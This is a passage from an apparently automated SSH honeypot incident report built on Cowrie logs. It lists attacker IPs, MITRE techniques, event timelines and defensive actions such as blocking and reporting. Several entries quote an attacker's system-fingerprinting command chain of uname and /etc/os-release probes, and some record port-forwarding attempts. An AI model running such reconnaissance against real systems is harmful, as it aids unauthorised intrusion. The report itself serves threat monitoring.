| `2026-07-21 05:26:02` | `cowrie.log.closed` |
| `2026-07-21 05:26:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b6e69fa008a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:26 |
| **Last Seen** | 2026-07-21 05:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:26:16` | `cowrie.session.connect` |
| `2026-07-21 05:26:17` | `cowrie.client.version` |
| `2026-07-21 05:26:17` | `cowrie.client.kex` |
| `2026-07-21 05:26:19` | `cowrie.login.success` |
| `2026-07-21 05:26:21` | `cowrie.session.params` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.success` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.command.input` |
| `2026-07-21 05:26:21` | `cowrie.log.closed` |
| `2026-07-21 05:26:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbf5b6f1622f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:28 |
| **Last Seen** | 2026-07-21 05:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:28:13` | `cowrie.session.connect` |
| `2026-07-21 05:28:13` | `cowrie.client.version` |
| `2026-07-21 05:28:13` | `cowrie.client.kex` |
| `2026-07-21 05:28:15` | `cowrie.login.success` |
| `2026-07-21 05:28:17` | `cowrie.session.params` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.success` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:17` | `cowrie.command.input` |
| `2026-07-21 05:28:18` | `cowrie.log.closed` |
| `2026-07-21 05:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e02a634d1ef

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:30 |
| **Last Seen** | 2026-07-21 05:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:30:09` | `cowrie.session.connect` |
| `2026-07-21 05:30:10` | `cowrie.client.version` |
| `2026-07-21 05:30:10` | `cowrie.client.kex` |
| `2026-07-21 05:30:12` | `cowrie.login.success` |
| `2026-07-21 05:30:13` | `cowrie.session.params` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.success` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.command.input` |
| `2026-07-21 05:30:13` | `cowrie.log.closed` |
| `2026-07-21 05:30:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e4198607f9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:32 |
| **Last Seen** | 2026-07-21 05:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:32:04` | `cowrie.session.connect` |
| `2026-07-21 05:32:05` | `cowrie.client.version` |
| `2026-07-21 05:32:05` | `cowrie.client.kex` |
| `2026-07-21 05:32:07` | `cowrie.login.success` |
| `2026-07-21 05:32:09` | `cowrie.session.params` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.success` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.command.input` |
| `2026-07-21 05:32:09` | `cowrie.log.closed` |
| `2026-07-21 05:32:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba81e1b0a6b

| Field | Detail |
|---|---|
| **Source IP** | `122.176.45[.]238` |
| **First Seen** | 2026-07-21 05:33 |
| **Last Seen** | 2026-07-21 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:33:01` | `cowrie.session.connect` |
| `2026-07-21 05:33:02` | `cowrie.client.version` |
| `2026-07-21 05:33:02` | `cowrie.client.kex` |
| `2026-07-21 05:33:04` | `cowrie.login.success` |
| `2026-07-21 05:33:04` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.45[.]238` to AbuseIPDB if not already reported
- [ ] Block `122.176.45[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1781c1f01a4c

| Field | Detail |
|---|---|
| **Source IP** | `81.195.152[.]14` |
| **First Seen** | 2026-07-21 05:33 |
| **Last Seen** | 2026-07-21 05:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:33:09` | `cowrie.session.connect` |
| `2026-07-21 05:33:10` | `cowrie.client.version` |
| `2026-07-21 05:33:10` | `cowrie.client.kex` |
| `2026-07-21 05:33:11` | `cowrie.login.success` |
| `2026-07-21 05:33:12` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:33:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.195.152[.]14` to AbuseIPDB if not already reported
- [ ] Block `81.195.152[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5453dafbee2e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:33 |
| **Last Seen** | 2026-07-21 05:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:33:56` | `cowrie.session.connect` |
| `2026-07-21 05:33:57` | `cowrie.client.version` |
| `2026-07-21 05:33:57` | `cowrie.client.kex` |
| `2026-07-21 05:33:59` | `cowrie.login.success` |
| `2026-07-21 05:34:00` | `cowrie.session.params` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.success` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:00` | `cowrie.command.input` |
| `2026-07-21 05:34:01` | `cowrie.log.closed` |
| `2026-07-21 05:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf05c4f6ec94

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-21 05:34 |
| **Last Seen** | 2026-07-21 05:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:34:03` | `cowrie.session.connect` |
| `2026-07-21 05:34:03` | `cowrie.client.version` |
| `2026-07-21 05:34:03` | `cowrie.client.kex` |
| `2026-07-21 05:34:03` | `cowrie.login.success` |
| `2026-07-21 05:34:03` | `cowrie.direct-tcpip.request` |
| `2026-07-21 05:34:03` | `cowrie.direct-tcpip.data` |
| `2026-07-21 05:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24dda0d7a222

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:35 |
| **Last Seen** | 2026-07-21 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:35:48` | `cowrie.session.connect` |
| `2026-07-21 05:35:49` | `cowrie.client.version` |
| `2026-07-21 05:35:49` | `cowrie.client.kex` |
| `2026-07-21 05:35:51` | `cowrie.login.success` |
| `2026-07-21 05:35:53` | `cowrie.session.params` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.success` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.command.input` |
| `2026-07-21 05:35:53` | `cowrie.log.closed` |
| `2026-07-21 05:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fc4d3b2312a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:37 |
| **Last Seen** | 2026-07-21 05:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:37:40` | `cowrie.session.connect` |
| `2026-07-21 05:37:41` | `cowrie.client.version` |
| `2026-07-21 05:37:41` | `cowrie.client.kex` |
| `2026-07-21 05:37:43` | `cowrie.login.success` |
| `2026-07-21 05:37:45` | `cowrie.session.params` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.success` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.command.input` |
| `2026-07-21 05:37:45` | `cowrie.log.closed` |
| `2026-07-21 05:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda55c80f7c3

| Field | Detail |
|---|---|
| **Source IP** | `45.33.12[.]122` |
| **First Seen** | 2026-07-21 05:39 |
| **Last Seen** | 2026-07-21 05:42 |
| **Session Duration** | 180s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:39:33` | `cowrie.session.connect` |
| `2026-07-21 05:39:33` | `cowrie.login.success` |
| `2026-07-21 05:39:33` | `cowrie.session.params` |
| `2026-07-21 05:42:33` | `cowrie.log.closed` |
| `2026-07-21 05:42:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.12[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.33.12[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f75f8153d5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:39 |
| **Last Seen** | 2026-07-21 05:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:39:33` | `cowrie.session.connect` |
| `2026-07-21 05:39:34` | `cowrie.client.version` |
| `2026-07-21 05:39:34` | `cowrie.client.kex` |
| `2026-07-21 05:39:36` | `cowrie.login.success` |
| `2026-07-21 05:39:37` | `cowrie.session.params` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.success` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:37` | `cowrie.command.input` |
| `2026-07-21 05:39:38` | `cowrie.log.closed` |
| `2026-07-21 05:39:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2960fd4b7f0a

| Field | Detail |
|---|---|
| **Source IP** | `45.33.12[.]122` |
| **First Seen** | 2026-07-21 05:39 |
| **Last Seen** | 2026-07-21 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:39:34` | `cowrie.session.connect` |
| `2026-07-21 05:39:34` | `cowrie.login.success` |
| `2026-07-21 05:39:35` | `cowrie.session.params` |
| `2026-07-21 05:39:35` | `cowrie.log.closed` |
| `2026-07-21 05:39:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.33.12[.]122` to AbuseIPDB if not already reported
- [ ] Block `45.33.12[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e65598ed050

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:41 |
| **Last Seen** | 2026-07-21 05:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:41:28` | `cowrie.session.connect` |
| `2026-07-21 05:41:29` | `cowrie.client.version` |
| `2026-07-21 05:41:29` | `cowrie.client.kex` |
| `2026-07-21 05:41:31` | `cowrie.login.success` |
| `2026-07-21 05:41:32` | `cowrie.session.params` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.success` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:32` | `cowrie.command.input` |
| `2026-07-21 05:41:33` | `cowrie.log.closed` |
| `2026-07-21 05:41:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16d01f62d2f5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 05:43 |
| **Last Seen** | 2026-07-21 05:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 05:43:26` | `cowrie.session.connect` |
| `2026-07-21 05:43:26` | `cowrie.client.version` |
| `2026-07-21 05:43:27` | `cowrie.client.kex` |
| `2026-07-21 05:43:28` | `cowrie.login.success` |
| `2026-07-21 05:43:30` | `cowrie.session.params` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.input` |
| `2026-07-21 05:43:30` | `cowrie.command.success` |
